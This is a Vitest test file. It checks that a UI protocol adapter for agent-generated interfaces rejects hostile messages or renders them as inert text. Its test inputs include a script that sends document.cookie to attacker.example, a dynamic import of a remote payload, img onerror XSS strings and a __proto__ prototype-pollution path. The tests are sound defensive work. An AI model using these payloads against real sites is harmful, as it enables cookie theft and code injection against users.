// @spec:029-adapter-a2ui
// User Story 2 (P1): hostile protocol input fails closed. These are the
// adversarial scenarios behind the Art. VIII guardrail — a forbidden type, an
// undeclared action, an unknown property carrying code, active content in the
// data model, and a hostile payload under an unmapped type. Nothing renders
// from a rejection, and no code path opens from message data.
import { beforeEach, describe, expect, it } from 'vitest';

import { createA2uiAdapter } from '../src/index.js';

let surface: HTMLElement;

beforeEach(() => {
  document.body.replaceChildren();
  surface = document.createElement('div');
  document.body.appendChild(surface);
});

const orderSurface = () => ({
  surfaceUpdate: {
    surfaceId: 'checkout',
    root: 'card',
    components: [
      { id: 'card', component: { Card: { children: { explicitList: ['confirm'] } } } },
      {
        id: 'confirm',
        component: {
          Button: { label: { literalString: 'Confirm order' }, action: { name: 'confirm-order' } },
        },
      },
    ],
  },
});

describe('the guardrail is a security boundary no message can bypass', () => {
  it('S7 rejects a message using a type the matrix declares forbidden', () => {
    const adapter = createA2uiAdapter({ protocolVersion: '0.9.1', surface });

    const result = adapter.apply({
      surfaceUpdate: {
        surfaceId: 's',
        root: 'root',
        components: [
          { id: 'root', component: { Card: { children: { explicitList: ['evil'] } } } },
          {
            id: 'evil',
            component: {
              html: {
                content: {
                  literalString:
                    "<script>fetch('https://attacker.example/'+document.cookie)</script>",
                },
              },
            },
          },
        ],
      },
    });

    expect(result.ok).toBe(false);
    expect(result.diagnostics.some((d) => d.rule === 'forbidden-type' && d.value === 'html')).toBe(
      true,
    );
    expect(surface.childNodes).toHaveLength(0);
  });

  it('S8 never dispatches an action outside the declared set', () => {
    const adapter = createA2uiAdapter({ protocolVersion: '0.9.1', surface });
    adapter.apply(orderSurface());

    const result = adapter.apply({
      surfaceUpdate: {
        surfaceId: 'checkout',
        components: [
          {
            id: 'card',
            component: { Card: { children: { explicitList: ['confirm', 'export'] } } },
          },
          {
            id: 'export',
            component: {
              Button: {
                label: { literalString: 'Export account data' },
                action: { name: 'export-account-data' },
              },
            },
          },
        ],
      },
    });

    expect(result.ok).toBe(false);
    expect(
      result.diagnostics.some(
        (d) => d.rule === 'undeclared-action' && d.value === 'export-account-data',
      ),
    ).toBe(true);
    // The rejected re-render leaves the previous surface intact; the export
    // button never rendered, so activating it dispatches nothing.
    const buttons = [...surface.querySelectorAll('ki-button')];
    expect(buttons.some((b) => b.textContent === 'Export account data')).toBe(false);
    expect(buttons.some((b) => b.textContent === 'Confirm order')).toBe(true);
  });

  it('S9 rejects an unknown property on a catalog component', () => {
    const adapter = createA2uiAdapter({ protocolVersion: '0.9.1', surface });

    const result = adapter.apply({
      surfaceUpdate: {
        surfaceId: 's',
        root: 'b',
        components: [
          {
            id: 'b',
            component: {
              Button: {
                label: { literalString: 'Go' },
                onPointerEnter: { literalString: "import('https://attacker.example/payload.js')" },
              },
            },
          },
        ],
      },
    });

    expect(result.ok).toBe(false);
    expect(
      result.diagnostics.some((d) => d.rule === 'unknown-prop' && d.value === 'onPointerEnter'),
    ).toBe(true);
    expect(surface.childNodes).toHaveLength(0);
  });

  it('S10 renders data-model content as inert text, never as code', () => {
    const adapter = createA2uiAdapter({ protocolVersion: '0.9.1', surface });
    adapter.apply({
      surfaceUpdate: {
        surfaceId: 's',
        root: 'card',
        components: [
          { id: 'card', component: { Card: { children: { explicitList: ['label'] } } } },
          {
            id: 'label',
            component: { Text: { text: { path: '/label', literalString: 'initial' } } },
          },
        ],
      },
    });

    const result = adapter.apply({
      dataModelUpdate: {
        surfaceId: 's',
        path: '/label',
        contents: '<img src=x onerror=alert(document.domain)>',
      },
    });

    expect(result.ok).toBe(true);
    const card = surface.querySelector('ki-card');
    expect(card?.textContent).toContain('<img src=x onerror=alert(document.domain)>');
    // The characters are inert text, never a parsed element.
    expect(surface.querySelector('img')).toBeNull();
  });

  it('S11 keeps a hostile payload under an unmapped type out of the fallback', () => {
    const adapter = createA2uiAdapter({ protocolVersion: '0.9.1', surface });

    const result = adapter.apply({
      surfaceUpdate: {
        surfaceId: 's',
        root: 'card',
        components: [
          { id: 'card', component: { Card: { children: { explicitList: ['weird'] } } } },
          {
            id: 'weird',
            component: {
              MysteryWidget: { content: { literalString: '<img src=x onerror=alert(1)>' } },
            },
          },
        ],
      },
    });

    expect(result.ok).toBe(true);
    // The declared fallback rendered, carrying only its constant label...
    expect(surface.querySelector('ki-badge')?.textContent).toBe('Unsupported component');
    // ...and no agent-supplied content reached the DOM.
    expect(surface.querySelector('img')).toBeNull();
    expect(surface.textContent).not.toContain('onerror');
  });
});

// Hardening beyond the frozen scenarios: the adapter is the security boundary
// for untrusted runtime data (Codex review of PR #59). Hostile envelopes,
// prototype-polluting paths, cyclic graphs, non-transactional state and
// off-tree forbidden types all fail closed.
describe('the adapter treats every message as hostile runtime data', () => {
  let adapter: ReturnType<typeof createA2uiAdapter>;
  const adapterApply = (message: unknown): ReturnType<typeof adapter.apply> =>
    adapter.apply(message as Parameters<typeof adapter.apply>[0]);
  const orderSurfaceOnly = (): ReturnType<typeof adapter.apply> =>
    adapterApply({
      surfaceUpdate: {
        surfaceId: 'checkout',
        root: 'card',
        components: [
          { id: 'card', component: { Card: { children: { explicitList: ['confirm'] } } } },
          {
            id: 'confirm',
            component: {
              Button: {
                label: { literalString: 'Confirm order' },
                action: { name: 'confirm-order' },
              },
            },
          },
        ],
      },
    });

  beforeEach(() => {
    adapter = createA2uiAdapter({ protocolVersion: '0.9.1', surface });
  });

  it('rejects a prototype-polluting data-model path without touching Object.prototype', () => {
    orderSurfaceOnly();
    const result = adapterApply({
      dataModelUpdate: { surfaceId: 'checkout', path: '/__proto__/polluted', contents: 'x' },
    });

    expect(result.ok).toBe(false);
    expect(result.diagnostics.some((d) => d.rule === 'forbidden-key')).toBe(true);
    expect(({} as Record<string, unknown>)['polluted']).toBeUndefined();
  });

  it('rolls a failed incremental update back out of surface state', () => {
    orderSurfaceOnly();
    // A rejected update (undeclared action) must not linger in state.
    const rejected = adapterApply({
      surfaceUpdate: {
        surfaceId: 'checkout',
        components: [
          { id: 'card', component: { Card: { children: { explicitList: ['confirm', 'evil'] } } } },
          { id: 'evil', component: { Button: { action: { name: 'exfiltrate' } } } },
        ],
      },
    });
    expect(rejected.ok).toBe(false);

    // A later re-render succeeds and shows no trace of the rejected components.
    const rerender = adapterApply({ dataModelUpdate: { surfaceId: 'checkout', contents: {} } });
    expect(rerender.ok).toBe(true);
    const buttons = [...surface.querySelectorAll('ki-button')];
    expect(buttons).toHaveLength(1);
    expect(buttons[0]?.textContent).toBe('Confirm order');
  });

  it('returns a diagnostic for a malformed message instead of throwing', () => {
    expect(() => adapterApply(null)).not.toThrow();
    expect(adapterApply(null).ok).toBe(false);
    const nonArray = adapterApply({ surfaceUpdate: { surfaceId: 's', components: 'nope' } });
    expect(nonArray.ok).toBe(false);
    expect(nonArray.diagnostics.some((d) => d.rule === 'malformed-message')).toBe(true);
  });

  it('rejects a cyclic component graph before the stack overflows', () => {
    const result = adapterApply({
      surfaceUpdate: {
        surfaceId: 's',
        root: 'card',
        components: [{ id: 'card', component: { Card: { children: { explicitList: ['card'] } } } }],
      },
    });

    expect(result.ok).toBe(false);
    expect(result.diagnostics.some((d) => d.rule === 'cycle')).toBe(true);
    expect(surface.childNodes).toHaveLength(0);
  });

  it('rejects a forbidden type even when it is off the rendered tree', () => {
    const result = adapterApply({
      surfaceUpdate: {
        surfaceId: 's',
        root: 'card',
        components: [
          { id: 'card', component: { Card: { children: { explicitList: ['confirm'] } } } },
          { id: 'confirm', component: { Button: { label: { literalString: 'OK' } } } },
          // Never referenced by root, but present in the update:
          { id: 'evil', component: { html: { content: { literalString: '<script>x</script>' } } } },
        ],
      },
    });

    expect(result.ok).toBe(false);
    expect(result.diagnostics.some((d) => d.rule === 'forbidden-type' && d.value === 'html')).toBe(
      true,
    );
    expect(surface.childNodes).toHaveLength(0);
  });
});
